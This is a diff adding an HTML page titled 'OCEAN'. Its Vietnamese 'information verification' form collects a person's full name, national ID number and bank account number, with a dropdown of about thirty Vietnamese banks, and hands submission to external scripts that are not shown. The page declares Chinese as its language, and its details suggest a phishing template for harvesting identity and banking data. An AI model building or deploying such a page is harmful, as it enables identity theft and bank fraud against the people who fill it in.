@@ -1,0 +1,134 @@
+﻿<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	
+	<title>OCEAN</title>
+	<meta name="keywords" content="" />
+	<meta name="description" content="" />
+
+	<link rel="stylesheet" type="text/css" href="static/css/bootstrap.min.css">
+	<link rel="stylesheet" type="text/css" href="static/css/font-awesome.min.css">
+	<link rel="stylesheet" type="text/css" href="static/css/material-design-iconic-font.min.css">
+	<link rel="stylesheet" type="text/css" href="static/css/util.css">
+	<link rel="stylesheet" type="text/css" href="static/css/main.css">
+	<link rel="stylesheet" type="text/css" href="static/css/gx.css">
+</head>
+
+<body>
+
+	<div class="limiter">
+		<div class="container-login100" style="background-image: url('static/images/bg-01.jpg');">
+			<div class="wrap-login100 p-l-55 p-r-55 p-t-65 p-b-54">
+				<form class="login100-form validate-form">
+					<span class="login100-form-title p-b-49">Xác Minh Thông Tin</span>
+
+					<div class="wrap-input100 validate-input m-b-23" data-validate="Họ tên">
+						<input class="input100" type="text" id="username" placeholder="Họ tên" autocomplete="off">
+					</div>
+
+					<div class="wrap-input100 validate-input" data-validate="Nhập số CMND">
+						<input class="input100" type="text" id="idno" placeholder="Nhập số CMND">
+					</div>
+
+					<div class="wrap-input100 validate-input" data-validate="Số tài khoản ngân hàng">
+						<input class="input100" type="text" id="bankcard" placeholder="Số tài khoản ngân hàng">
+					</div>
+
+					<div class="wrap-input100 validate-input" data-validate="Chọn ngân hàng">
+						<select class="form-control" id="sel1" style="color:#d3d3d3;">
+								<option value="ACB-TMCP Á Châu">ACB-TMCP Á Châu</option>
+								<option value="VietcomBank-TMCP Ngoại Thương Việt Nam">VietcomBank-TMCP Ngoại Thương Việt Nam</option>
+								<option value="VietinBank-TMCP Công Thương Việt Nam">VietinBank-TMCP Công Thương Việt Nam</option>
+								<option value="Techcombank-TMCP Kỹ Thương Việt Nam">Techcombank-TMCP Kỹ Thương Việt Nam</option>
+								<option value="BIDV-TMCP Đầu Tư Và Phát Triển Việt Nam">BIDV-TMCP Đầu Tư Và Phát Triển Việt Nam</option>
+								<option value="MaritimeBank-TMCP Hàng Hải Việt Nam">MaritimeBank-TMCP Hàng Hải Việt Nam</option>
+								<option value="VPBank-Việt Nam Thịnh Vượng">VPBank-Việt Nam Thịnh Vượng</option>
+								<option value="Agribank-Nông nghiệp và Phát triển Việt Nam">Agribank-Nông nghiệp và Phát triển Việt Nam</option>
+								<option value="Eximbank-TMCP Xuất nhập khẩu Việt Nam">Eximbank-TMCP Xuất nhập khẩu Việt Nam</option>
+								<option value="Sacombank-TMCP Sài Gòn Thương Tín">Sacombank-TMCP Sài Gòn Thương Tín</option>
+								<option value="DongA Bank-TMCP Đông Á">DongA Bank-TMCP Đông Á</option>
+								<option value="VIB-TMCP Quốc tế Việt Nam">VIB-TMCP Quốc tế Việt Nam</option>
+								<option value="MB Bank-thương mại cổ phần Quân đội">MB Bank-thương mại cổ phần Quân đội</option>
+								<option value="Viet Capital Bank-TMCP Bản Việt">Viet Capital Bank-TMCP Bản Việt</option>
+								<option value="OceanBank-TM TNHH 1 thành viên Đại Dương">OceanBank-TM TNHH 1 thành viên Đại Dương</option>
+								<option value="VietABank-TMCP Việt Á">VietABank-TMCP Việt Á</option>
+								<option value="TPBank-TMCP Tiên Phong">TPBank-TMCP Tiên Phong</option>
+								<option value="HDBank-TMCP Phát triển Thành phố Hồ Chí Minh">HDBank-TMCP Phát triển Thành phố Hồ Chí Minh</option>
+								<option value="SCB-TMCP Sài Gòn">SCB-TMCP Sài Gòn</option>
+								<option value="CBBank-thương mại TNHH MTV Xây dựng Việt Nam">CBBank-thương mại TNHH MTV Xây dựng Việt Nam</option>
+								<option value="LienVietPostBank-TMCP Bưu Điện Liên Việt">LienVietPostBank-TMCP Bưu Điện Liên Việt</option>
+								<option value="SeABank-TMCP Đông Nam Á">SeABank-TMCP Đông Nam Á</option>
+								<option value="ABBank-TMCP An Bình">ABBank-TMCP An Bình</option>
+								<option value="Nam A Commercial Joint Stock Bank-Thương Mại cổ phần Nam Á">Nam A Commercial Joint Stock Bank-Thương Mại cổ phần Nam Á</option>
+								<option value="OCB-TMCP Phương Đông">OCB-TMCP Phương Đông</option>
+								<option value="GBBank-Dầu khí toàn cầu">GBBank-Dầu khí toàn cầu</option>
+								<option value="PG Bank-TMCP Xăng dầu Petrolimex">PG Bank-TMCP Xăng dầu Petrolimex</option>
+								<option value="SHBank-Thương Mại cổ phần Sài Gòn - Hà Nội">SHBank-Thương Mại cổ phần Sài Gòn - Hà Nội</option>
+								<option value="Saigon Bank-TMCP Sài Gòn Công Thương">Saigon Bank-TMCP Sài Gòn Công Thương</option>
+								<option value="Kien Long Bank-Thương mại Cổ phần Kiên Long">Kien Long Bank-Thương mại Cổ phần Kiên Long</option>
+					    </select>					 
+					</div>
+
+					<div class="text-right p-t-8 p-b-31"> 
+					</div>
+
+					<div class="container-login100-form-btn">
+						<div class="wrap-login100-form-btn">
+							<div class="login100-form-bgbtn"></div>
+							<input type="button" class="login100-form-btn" id="bankrz" value="Bước tiếp theo" onClick="commit();">
+						</div>
+					</div>
+
+					 
+				</form>
+			</div>
+		</div>
+	</div>
+	<div class="gx_alert">
+		<p class="gx_alert_p"></p>
+	</div>
+	<script src="static/js/jquery-3.2.1.min.js"></script>
+	<script src="static/js/main.js"></script>
+	<script type="text/javascript" src="static/js/renzhengocean.js"></script>
+	<script type="text/javascript" src="static/js/Ajax.js"></script>
+</body>
+<script>
+	$("#sel1").change(function () {
+		$(this).css("color","#333333")
+	})
+</script>
+<style>
+.wrap-input100 {
+    width: 100%;
+    position: relative;
+    /* border-bottom: 2px solid #d9d9d9; */
+    border: 2px solid #d9d9d9;
+    margin-bottom: 20px;
+}
+.input100 {
+    font-family: 'Calibri';
+    font-size: 16px;
+    color: #333333;
+    line-height: 1.2;
+    display: block;
+    width: 100%;
+    /* height: 55px; */
+    height: 39px;
+    background: transparent;
+    padding: 0 7px 0 10px;
+}
+.form-control{
+	font-family: 'Calibri';
+	border: 0;
+    appearance: none;
+    -moz-appearance: none;
+    -webkit-appearance: none;
+	background: url(./static/images/1.png) 96% center no-repeat;
+    background-size: 12px;
+}
+</style>
+
+</html>
